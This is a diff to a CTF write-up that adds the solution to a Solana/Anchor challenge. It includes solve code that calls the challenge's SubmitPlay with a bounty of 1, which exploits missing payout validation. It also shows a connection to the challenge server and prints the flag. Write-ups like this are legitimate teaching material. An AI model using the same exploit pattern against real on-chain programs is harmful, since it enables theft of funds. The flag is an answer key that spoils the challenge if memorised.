@@ -235,7 +235,111 @@ async fn handle_connection(mut socket: TcpStream) -> Result<(), Box<dyn Error>> 
 }
 ```
 
-ok this writeup still wip lol
+In the above, we can see two things that happen
+
+1. an initial setup where player "cookiezi" is given a large sum of money.
+2. the server then processes a "SubmitPlay" instruction, which allows for the submission of a play that meets specific bounty amount
+
+from looking at the above code,we are aware that we can exploit the `SubmitPlay`, as it doesn't properly validate the required conditions where bounty payout should happen, and doesn't make sure that the play submitted meets specific criteria beyond the control of the submitting player
+
+We can write our solution code inside the provided `initialize` function in the `framework-solve/solve/programs/solve/src/lib.rs` file that is specifically for writing the solution code, where we have:
+
+```rust
+use anchor_lang::prelude::*;
+use chall::Play;
+
+declare_id!("28prS7e14Fsm97GE5ws2YpjxseFNkiA33tB5D3hLZv3t");
+
+#[program]
+pub mod solve {
+    use super::*;
+
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        let cpi_accounts = chall::cpi::accounts::SubmitPlay {
+            db: ctx.accounts.db.to_account_info(),
+            player: ctx.accounts.user.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+        };
+
+        let play = Play {
+            // i think the map name is blue zenith
+            map: "blue zenith".to_string(),
+            player: "chocomint".to_string(),
+            pp: 728,
+            bounty: 1, // min bounty amount was 500_000_000_000_000
+        };
+
+        let cpi_program = ctx.accounts.chall.to_account_info();
+        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
+
+        chall::cpi::submit_play(cpi_ctx, play)?;
+
+        Ok(())
+    }
+}
+
+#[derive(Accounts)]
+pub struct Initialize<'info> {
+    // feel free to expand/change this as needed
+    // if you change this, make sure to change framework-solve/src/main.rs accordingly
+    #[account(mut)]
+    pub user: Signer<'info>,
+
+    #[account(mut)]
+    pub db: AccountInfo<'info>,
+
+    pub chall: Program<'info, chall::program::Chall>,
+
+    pub system_program: Program<'info, System>,
+
+    pub rent: Sysvar<'info, Rent>,
+}
+```
+
+Looking closely, this is the specific code we wrote
+
+```rust
+pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        let cpi_accounts = chall::cpi::accounts::SubmitPlay {
+            db: ctx.accounts.db.to_account_info(),
+            player: ctx.accounts.user.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+        };
+
+        let play = Play {
+            // the map name is blue zenith
+            map: "blue zenith".to_string(),
+            player: "chocomint".to_string(),
+            pp: 728,
+            bounty: 1, // i think min bounty amount was 500_000_000_000_000 but this worked
+        };
+
+        let cpi_program = ctx.accounts.chall.to_account_info();
+        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
+
+        chall::cpi::submit_play(cpi_ctx, play)?;
+
+        Ok(())
+    }
+```
+
+And this works, as we can verify this locally
+![solved locally](img/image.png)
+
+And after changing in `framework-solve/src/main.rs` to nc to the challenge server
+```rust
+fn main() -> Result<(), Box<dyn Error>> {
+    let mut stream = TcpStream::connect("chal2.osugaming.lol:8000")?;
+    let mut reader = BufReader::new(stream.try_clone().unwrap());
+
+    let mut line = String::new();
+
+    let so_data = fs::read("./solve/target/deploy/solve.so")?;
+}
+```
+
+![actual flag](image2.png)
+We are able to run the solve script again and we get the flag `osu{blud_think_he_mrekk}`.
 
 ### reverse/SAT-before-osu
 > My mom won’t let me play osu if I don’t study for the SAT but this looks nothing like it! Please help me! T^T<br>
